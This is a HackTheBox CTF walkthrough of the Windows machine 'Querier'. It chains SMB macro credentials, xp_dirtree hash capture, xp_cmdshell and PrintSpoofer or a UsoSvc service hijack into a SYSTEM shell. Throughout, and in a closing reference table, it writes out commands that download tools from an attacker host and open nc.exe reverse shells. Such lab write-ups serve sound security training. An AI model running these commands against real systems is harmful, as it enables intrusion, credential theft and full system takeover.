# Querier: HackTheBox

---

## Metadata

| Field | Details |
| --- | --- |
| **Platform** | HackTheBox |
| **Machine** | Querier |
| **OS** | Windows |
| **Difficulty** | Medium |
| **Attacker IP** | 10.10.16.36 |
| **Target IP** | 10.129.13.71 |
| **Tools Used** | Nmap, smbclient, binwalk, impacket-mssqlclient, Responder, hashcat, Python HTTP Server, nc.exe, PrintSpoofer64 |
| **Techniques** | Anonymous SMB Enumeration, XLSM Macro Analysis, MSSQL Credential Abuse, xp_dirtree NTLMv2 Hash Capture, NetNTLMv2 Cracking, xp_cmdshell RCE, SeImpersonatePrivilege Abuse, PrintSpoofer Privilege Escalation |
| **Date** | June 2026 |

---

## Attack Chain Summary

```
Nmap scan → SMB anonymous access → Currency Volume Report.xlsm →
binwalk extraction → VBA macro → MSSQL credentials (reporting:PcwTWTHRwryjc$c6) →
impacket-mssqlclient → xp_dirtree → Responder captures NTLMv2 hash →
hashcat cracks mssql-svc:corporate568 → Re-login as mssql-svc (sysadmin) →
xp_cmdshell enabled → nc.exe transfer via PowerShell → Reverse shell as mssql-svc →
SeImpersonatePrivilege confirmed → Spooler running → PrintSpoofer64 →
NT AUTHORITY\SYSTEM → Root flag
```

---

## Step 1: Reconnaissance

**Goal:** Identify open ports and services on the target.

```
Hackerpatel007_1@htb[/htb]$ nmap -sS -sV -sC -Pn -p- -T4 10.129.13.71 -oA querier
Starting Nmap 7.98 ( https://nmap.org )
Nmap scan report for 10.129.13.71
Host is up (0.46s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info:
|   10.129.13.71:1433:
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: QUERIER
|     DNS_Domain_Name: HTB.LOCAL
|     DNS_Computer_Name: QUERIER.HTB.LOCAL
|     DNS_Tree_Name: HTB.LOCAL
|_    Product_Version: 10.0.17763
| ms-sql-info:
|   10.129.13.71:1433:
|     Version:
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|_    TCP port: 1433
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664-49671/tcp open msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
```

**Output Analysis**

| Port | Service | Notes |
| --- | --- | --- |
| 139/445 | SMB | Anonymous enumeration: primary first step |
| 1433 | MSSQL 2017 | SQL Server exposed: domain: HTB.LOCAL |
| 5985 | WinRM | Available but not needed for this path |
| 49664+ | RPC | Standard Windows RPC |

Two clear attack surfaces: SMB shares and an exposed MSSQL instance on a domain-joined machine (`HTB.LOCAL`).

---

## Step 2: SMB Enumeration and File Download

**Goal:** Enumerate SMB shares anonymously and retrieve any accessible files.

```
Hackerpatel007_1@htb[/htb]$ smbclient -L //10.129.13.71 -N

    Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Remote Admin
    C$              Disk      Default share
    IPC$            IPC       Remote IPC
    Reports         Disk
```

`Reports` is a non-default share: connected anonymously:

```
Hackerpatel007_1@htb[/htb]$ smbclient //10.129.13.71/Reports -N
Try "help" to get a list of available commands.
smb: \> ls
  .                                   D        0  Mon Jan 28 18:23:48 2019
  ..                                  D        0  Mon Jan 28 18:23:48 2019
  Currency Volume Report.xlsm        A    12229  Sun Jan 27 18:21:34 2019

smb: \> get "Currency Volume Report.xlsm"
getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm
smb: \> exit
```

An `.xlsm` file: a macro-enabled Excel workbook. VBA macros can contain hardcoded credentials or connection strings.

---

## Step 3: Extract VBA Macro from XLSM

**Goal:** Extract and read the VBA macro embedded in the Excel file to find any hardcoded credentials.

An `.xlsm` file is a ZIP archive. Used `binwalk` to extract its contents:

```
Hackerpatel007_1@htb[/htb]$ binwalk -e 'Currency Volume Report.xlsm'

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Zip archive data
...

Hackerpatel007_1@htb[/htb]$ cd '_Currency Volume Report.xlsm.extracted'/xl
Hackerpatel007_1@htb[/htb]$ ls
hash.txt  _rels  styles.xml  theme  vbaProject.bin  workbook.xml  worksheets
```

Read the raw VBA project binary: connection strings are stored in plaintext:

```
Hackerpatel007_1@htb[/htb]$ strings vbaProject.bin | grep -i "uid\|pwd\|server\|connect"
Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6
```

**Credentials Extracted from VBA Macro**

| Field | Value |
| --- | --- |
| Username | `reporting` |
| Password | `PcwTWTHRwryjc$c6` |
| Server | `QUERIER` |
| Database | `volume` |

---

## Step 4: MSSQL Login as `reporting`

**Goal:** Connect to the MSSQL instance using the discovered credentials and assess privilege level.

```
Hackerpatel007_1@htb[/htb]$ impacket-mssqlclient reporting@10.129.13.71 -windows-auth
Impacket v0.11.0 - Copyright 2023 SecureAuth Corporation

Password: PcwTWTHRwryjc$c6
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER\MSSQLSERVER): Line 1: Changed database context to 'volume'.
[*] ACK: Result: 1 - Microsoft SQL Server (140 750)
[!] Press help for extra shell commands
SQL>
```

Checked privilege level:

```
SQL> SELECT IS_SRVROLEMEMBER('sysadmin');

-----------
          0
```

The `reporting` account is not a sysadmin: `xp_cmdshell` cannot be enabled directly. A higher-privilege account is needed.

---

## Step 5: NTLMv2 Hash Capture via xp_dirtree

**Goal:** Force the MSSQL service account to authenticate to a controlled SMB server, capturing its NTLMv2 hash.

Started Responder on the attacker machine to intercept NTLM authentication:

```
Hackerpatel007_1@htb[/htb]$ sudo responder -I tun0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MULTICAST Poisoner.

[+] Listening for events...
```

From inside the MSSQL session, triggered an outbound SMB connection to the attacker:

```
SQL> EXEC xp_dirtree '\\10.10.16.36\test';
```

Responder captured the NTLMv2 hash:

```
[SMB] NTLMv2-SSP Client   : 10.129.13.71
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:5eb0b85bf8c0f34a:B3380241C20879904831EFA1EF218649:0101000000000000000557F1A7F4DC010A50AD63D7821CC500000000020008004F004E004F00500001001E00570049004E002D0033003200580059005900380031004A0049004F00480004003400570049004E002D0033003200580059005900380031004A0049004F0048002E004F004E004F0050002E004C004F00430041004C00030014004F004E004F0050002E004C004F00430041004C00050014004F004E004F0050002E004C004F00430041004C0007000800000557F1A7F4DC010600040002000000080030003000000000000000000000000030000019B4905B1B0C97952AAE6E7B609C3D54FB0F8386B4A684DE2A2BD5068300FE690A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E0033003600000000000000000000000000
```

Hash belongs to `QUERIER\mssql-svc`: the service account running MSSQL.

---

## Step 6: Crack NTLMv2 Hash with hashcat

**Goal:** Crack the captured NetNTLMv2 hash offline using rockyou.

Saved the hash to a file and ran hashcat:

```
Hackerpatel007_1@htb[/htb]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

MSSQL-SVC::QUERIER:5eb0b85bf8c0f34a:b3380241c20879904831efa1ef218649:....:corporate568

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Time.Started.....: Fri Jun  5 06:28:11 2026 (5 secs)
Time.Estimated...: Fri Jun  5 06:28:16 2026 (0 secs)
Speed.#01........:  1947.4 kH/s (1.99ms)
Recovered........: 1/1 (100.00%) Digests
```

**Credentials Recovered**

| Account | Password |
| --- | --- |
| `mssql-svc` | `corporate568` |

---

## Step 7: MSSQL Login as `mssql-svc`: Sysadmin Confirmed

**Goal:** Log in as `mssql-svc` and confirm sysadmin access to enable `xp_cmdshell`.

```
Hackerpatel007_1@htb[/htb]$ impacket-mssqlclient mssql-svc@10.129.13.71 -windows-auth
Impacket v0.11.0 - Copyright 2023 SecureAuth Corporation

Password: corporate568
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ACK: Result: 1 - Microsoft SQL Server (140 750)
SQL>
```

Confirmed sysadmin:

```
SQL> SELECT IS_SRVROLEMEMBER('sysadmin');

-----------
          1
```

Enabled `xp_cmdshell`:

```
SQL> EXEC sp_configure 'show advanced options', 1;
[*] INFO(QUERIER\MSSQLSERVER): Line 185: Configuration option 'show advanced options' changed from 0 to 1.
SQL> RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1;
[*] INFO(QUERIER\MSSQLSERVER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1.
SQL> RECONFIGURE;
```

Confirmed command execution:

```
SQL> EXEC xp_cmdshell 'whoami';

output
-------
querier\mssql-svc
```

---

## Step 8: File Transfer and Reverse Shell

**Goal:** Transfer `nc.exe` to the target and establish a reverse shell.

`certutil` was blocked. Used PowerShell's `Invoke-WebRequest` instead.

Started a Python HTTP server to host `nc.exe`:

```
Hackerpatel007_1@htb[/htb]$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 ...
```

Downloaded `nc.exe` to the target via `xp_cmdshell`:

```
SQL> EXEC xp_cmdshell 'powershell -c Invoke-WebRequest "http://10.10.16.36:8000/nc.exe" -OutFile "C:\Users\mssql-svc\nc.exe"';
```

HTTP server confirmed the download:

```
10.129.13.71 - - [05/Jun/2026 06:35:22] "GET /nc.exe HTTP/1.1" 200 -
```

Started a netcat listener on the attacker machine:

```
Hackerpatel007_1@htb[/htb]$ nc -lvnp 4444
listening on [any] 4444 ...
```

Triggered the reverse shell:

```
SQL> EXEC xp_cmdshell 'C:\Users\mssql-svc\nc.exe 10.10.16.36 4444 -e cmd.exe';
```

Shell received:

```
connect to [10.10.16.36] from (UNKNOWN) [10.129.13.71] 49832
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
querier\mssql-svc
```

---

## Step 9: User Flag

**Goal:** Locate and capture the user flag.

```
C:\Windows\system32> cd C:\Users\mssql-svc\Desktop
C:\Users\mssql-svc\Desktop> type user.txt
0b2968f2d314b066793be7226625c6f1
```

**Flag Breakdown**

| Flag | Value |
| --- | --- |
| User Flag | `0b2968f2d314b066793be7226625c6f1` |

---

## Step 10: Privilege Enumeration

**Goal:** Identify privilege escalation vectors available to `mssql-svc`.

```
C:\Users\mssql-svc> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

`SeImpersonatePrivilege` is **Enabled**: this allows token impersonation and is the classic foothold for PrintSpoofer/Potato-family escalation on Windows Server 2019.

Confirmed OS version:

```
C:\Users\mssql-svc> systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
```

Checked whether the Print Spooler service was running:

```
C:\Users\mssql-svc> sc query Spooler

SERVICE_NAME: Spooler
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

**Print Spooler is running.** Combined with `SeImpersonatePrivilege`, this enables a PrintSpoofer attack: a local privilege escalation technique that abuses the Spooler service to capture a SYSTEM token.

---

## Step 11: Privilege Escalation via PrintSpoofer

**Goal:** Use PrintSpoofer to escalate from `mssql-svc` to `NT AUTHORITY\SYSTEM`.

From the existing reverse shell as `mssql-svc`, transferred `PrintSpoofer64.exe` directly using PowerShell:

```
C:\Users\mssql-svc> powershell -c Invoke-WebRequest "http://10.10.16.36:8000/PrintSpoofer64.exe" -OutFile "C:\Users\mssql-svc\PrintSpoofer64.exe"
```

HTTP server confirmed the download:

```
10.129.13.71 - - [05/Jun/2026 06:51:14] "GET /PrintSpoofer64.exe HTTP/1.1" 200 -
```

Started a second listener for the SYSTEM shell:

```
Hackerpatel007_1@htb[/htb]$ nc -lvnp 5555
listening on [any] 5555 ...
```

Executed PrintSpoofer from the existing `mssql-svc` shell:

```
C:\Users\mssql-svc> PrintSpoofer64.exe -c "C:\Users\mssql-svc\nc.exe 10.10.16.36 5555 -e cmd"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```

SYSTEM shell received:

```
connect to [10.10.16.36] from (UNKNOWN) [10.129.13.71] 49901
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

---

## Step 12: Root Flag

**Goal:** Navigate to the Administrator desktop and capture the root flag.

```
C:\Windows\system32> cd C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop> type root.txt
ea01c1f1e28c957e8bd0dc07efb89513
```

**Flag Breakdown**

| Flag | Value |
| --- | --- |
| Root Flag | `ea01c1f1e28c957e8bd0dc07efb89513` |

---

## Privilege Escalation: Path 2: Service Binary Path Hijack (UsoSvc)

**Goal:** Abuse a misconfigured service writable by `mssql-svc` to execute a payload as `LocalSystem`.

This path was discovered by running `PowerUp.ps1` from PowerSploit, which audits common Windows privilege escalation misconfigurations automatically.

Loaded and ran PowerUp on the target:

```
C:\Users\mssql-svc> powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
```

PowerUp reported that `mssql-svc` had `sc config` rights over `UsoSvc` (Update Orchestrator Service): meaning the service binary path could be rewritten without administrator privileges.

Verified the service configuration before modification:

```
C:\Users\mssql-svc> sc qc UsoSvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: UsoSvc
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START  (DELAYED)
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k netsvcs -p
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Update Orchestrator Service
        DEPENDENCIES       : rpcss
        SERVICE_START_NAME : LocalSystem
```

`SERVICE_START_NAME: LocalSystem`: any binary placed here will execute as `NT AUTHORITY\SYSTEM`.

Hijacked the binary path to point to `nc.exe`:

```
C:\Users\mssql-svc> sc config UsoSvc binpath= "C:\Users\mssql-svc\nc.exe 10.10.16.36 6666 -e cmd.exe"
[SC] ChangeServiceConfig SUCCESS
```

Confirmed the change:

```
C:\Users\mssql-svc> sc qc UsoSvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: UsoSvc
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START  (DELAYED)
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Users\mssql-svc\nc.exe 10.10.16.36 6666 -e cmd.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Update Orchestrator Service
        DEPENDENCIES       : rpcss
        SERVICE_START_NAME : LocalSystem
```

Started a listener on the attacker machine:

```
Hackerpatel007_1@htb[/htb]$ nc -lvnp 6666
listening on [any] 6666 ...
```

Restarted the service to trigger payload execution:

```
C:\Users\mssql-svc> sc stop UsoSvc
SERVICE_NAME: UsoSvc
        TYPE               : 30  WIN32
        STATE              : 3  STOP_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)

C:\Users\mssql-svc> sc start UsoSvc
[SC] StartService FAILED 1053:
The service did not respond to the start or control request in a timely fashion.
```

The `1053` error is expected: `nc.exe` does not behave like a proper Windows service and never signals back to the Service Control Manager. Despite the error, the binary executes before the timeout, and the reverse shell is caught:

```
connect to [10.10.16.36] from (UNKNOWN) [10.129.13.71] 49944
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

`NT AUTHORITY\SYSTEM` obtained via service binary path hijack: no exploit required, only a misconfigured service ACL.

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Detail |
| --- | --- | --- | --- |
| Reconnaissance | Network Service Scanning | T1046 | nmap -sS -sV -sC full port scan |
| Discovery | Network Share Discovery | T1135 | smbclient -L anonymous share enumeration |
| Collection | Data from Network Shared Drive | T1039 | Downloaded Currency Volume Report.xlsm from Reports share |
| Credential Access | Credentials in Files | T1552.001 | VBA macro in vbaProject.bin contained hardcoded MSSQL connection string |
| Initial Access | Valid Accounts: Local Accounts | T1078.003 | reporting:PcwTWTHRwryjc$c6 used to authenticate to MSSQL |
| Credential Access | Forced Authentication | T1187 | xp_dirtree forced outbound SMB auth from MSSQL service account |
| Credential Access | Network Sniffing | T1040 | Responder captured NTLMv2 hash on tun0 |
| Credential Access | Brute Force: Password Cracking | T1110.002 | hashcat -m 5600 cracked NetNTLMv2 hash for mssql-svc |
| Execution | Command and Scripting Interpreter: SQL | T1059 | xp_cmdshell enabled via sp_configure for OS command execution |
| Lateral Movement | Valid Accounts: Local Accounts | T1078.003 | mssql-svc:corporate568 re-authenticated with sysadmin rights |
| Command and Control | Ingress Tool Transfer | T1105 | nc.exe and PrintSpoofer64.exe downloaded via PowerShell Invoke-WebRequest |
| Execution | Command and Scripting Interpreter: Windows Command Shell | T1059.003 | nc.exe -e cmd.exe reverse shell established |
| Privilege Escalation | Access Token Manipulation: Token Impersonation | T1134.001 | PrintSpoofer64 abused SeImpersonatePrivilege + Print Spooler to obtain SYSTEM token |
| Privilege Escalation | Create or Modify System Process: Windows Service | T1543.003 | UsoSvc binary path hijacked via sc config to execute nc.exe as LocalSystem |

---

## Lessons Learned

**1. Macro-enabled Office files are a goldmine for credentials.**
The `.xlsm` file contained a VBA macro with a hardcoded MSSQL connection string including plaintext username and password. In real assessments, any Office file found on an SMB share should be examined for macros. `binwalk -e` is a fast way to extract the internal `vbaProject.bin` without needing Excel.

**2. xp_dirtree is a reliable NTLMv2 hash theft vector inside MSSQL.**
Even a low-privilege MSSQL account can execute `xp_dirtree` to force an outbound SMB connection. When combined with Responder on a controlled network interface, this reliably captures the NetNTLMv2 hash of the service account running MSSQL: which frequently has higher privileges than the login account used.

**3. Service accounts running MSSQL are often sysadmins.**
The `reporting` account had read-only access. The `mssql-svc` service account was a sysadmin. This is a common misconfiguration: the service account needs elevated SQL privileges to function, and administrators often over-provision it. Capturing the service account hash and cracking it escalated from read-only SQL access to full command execution.

**4. `certutil` is not the only file transfer method: PowerShell is a reliable fallback.**
When `certutil` is blocked by Defender or AppLocker, `Invoke-WebRequest` via PowerShell is a clean alternative. Both are LOLBINs but defenders increasingly block `certutil`. Having multiple transfer methods ready is important.

**5. PowerUp.ps1 surfaces misconfigured service ACLs that manual enumeration easily misses.**
Running `Invoke-AllChecks` from PowerUp identified that `mssql-svc` had `sc config` rights over `UsoSvc`: a service running as `LocalSystem`. This kind of misconfiguration is invisible to `whoami /priv` and only appears when auditing service DACLs. PowerUp should be a standard part of Windows privilege escalation enumeration alongside manual checks.

**6. Service binary path hijack is reliable and requires no exploit.**
Rewriting a service's `binpath` to a reverse shell binary is a clean, exploit-free escalation path. The `1053` timeout error from `sc start` is expected and harmless when the payload is `nc.exe`: the shell is caught before the SCM timeout fires. Always verify `SERVICE_START_NAME` before hijacking; `LocalSystem` means instant SYSTEM access.

**7. SeImpersonatePrivilege + Print Spooler = SYSTEM on Windows Server 2019.**
Any service account running under an IIS app pool, MSSQL, or similar service context typically holds `SeImpersonatePrivilege`. On builds where the Spooler service is running, PrintSpoofer is reliable and fast. The combination of confirming the privilege with `whoami /priv` and the service state with `sc query Spooler` before running the exploit is the correct verification workflow.

---

## Full Attack Chain Reference

1. Ran `nmap -sS -sV -sC -Pn -p-`: identified SMB on 445 and MSSQL on 1433
2. Listed SMB shares anonymously: found `Reports` share
3. Downloaded `Currency Volume Report.xlsm` from `Reports` share
4. Extracted XLSM with `binwalk -e`: located `vbaProject.bin`
5. Read VBA binary with `strings`: found MSSQL credentials `reporting:PcwTWTHRwryjc$c6`
6. Connected to MSSQL with `impacket-mssqlclient` as `reporting`
7. Confirmed `reporting` is not sysadmin: `xp_cmdshell` unavailable
8. Started Responder on `tun0`
9. Ran `EXEC xp_dirtree '\\10.10.16.36\test'`: forced outbound SMB auth
10. Responder captured NTLMv2 hash for `mssql-svc`
11. Cracked hash with `hashcat -m 5600`: password: `corporate568`
12. Reconnected to MSSQL as `mssql-svc`: confirmed sysadmin
13. Enabled `xp_cmdshell` via `sp_configure`
14. Confirmed RCE with `EXEC xp_cmdshell 'whoami'`
15. Transferred `nc.exe` via `Invoke-WebRequest` through `xp_cmdshell`
16. Executed `nc.exe`: caught reverse shell as `mssql-svc`
17. Captured user flag from `C:\Users\mssql-svc\Desktop\user.txt`
18. Ran `whoami /priv`: `SeImpersonatePrivilege` enabled
19. Confirmed Windows Server 2019 and Print Spooler running
20. Transferred `PrintSpoofer64.exe` via `Invoke-WebRequest`
21. Executed PrintSpoofer: caught SYSTEM shell on second listener
22. Navigated to `C:\Users\Administrator\Desktop`: captured root flag

---

## Commands Reference

| Command | Purpose |
| --- | --- |
| `nmap -sS -sV -sC -Pn -p- -T4 10.129.13.71 -oA querier` | Full stealth scan across all ports |
| `smbclient -L //10.129.13.71 -N` | List SMB shares anonymously |
| `smbclient //10.129.13.71/Reports -N` | Connect to Reports share without credentials |
| `binwalk -e 'Currency Volume Report.xlsm'` | Extract XLSM archive contents |
| `strings vbaProject.bin` | Read printable strings from VBA binary |
| `impacket-mssqlclient reporting@10.129.13.71 -windows-auth` | Connect to MSSQL with Windows auth |
| `SELECT IS_SRVROLEMEMBER('sysadmin');` | Check sysadmin role membership |
| `sudo responder -I tun0 -v` | Start Responder to capture NTLMv2 hashes |
| `EXEC xp_dirtree '\\10.10.16.36\test';` | Force outbound SMB auth from MSSQL |
| `hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt` | Crack NetNTLMv2 hash |
| `EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;` | Enable OS command execution via MSSQL |
| `powershell -c Invoke-WebRequest "http://10.10.16.36:8000/nc.exe" -OutFile "C:\Users\mssql-svc\nc.exe"` | Download file to target via PowerShell |
| `EXEC xp_cmdshell 'C:\Users\mssql-svc\nc.exe 10.10.16.36 4444 -e cmd.exe';` | Trigger reverse shell from MSSQL |
| `whoami /priv` | Check current token privileges |
| `sc query Spooler` | Verify Print Spooler service state |
| `PrintSpoofer64.exe -c "C:\Users\mssql-svc\nc.exe 10.10.16.36 5555 -e cmd"` | Escalate to SYSTEM via SeImpersonatePrivilege |
| `powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"` | Enumerate Windows privilege escalation vectors |
| `sc qc UsoSvc` | Query service configuration and start account |
| `sc config UsoSvc binpath= "C:\Users\mssql-svc\nc.exe 10.10.16.36 6666 -e cmd.exe"` | Hijack service binary path to reverse shell |
| `sc stop UsoSvc` | Stop service before restart to trigger payload |
| `sc start UsoSvc` | Start service: executes hijacked binary as LocalSystem |
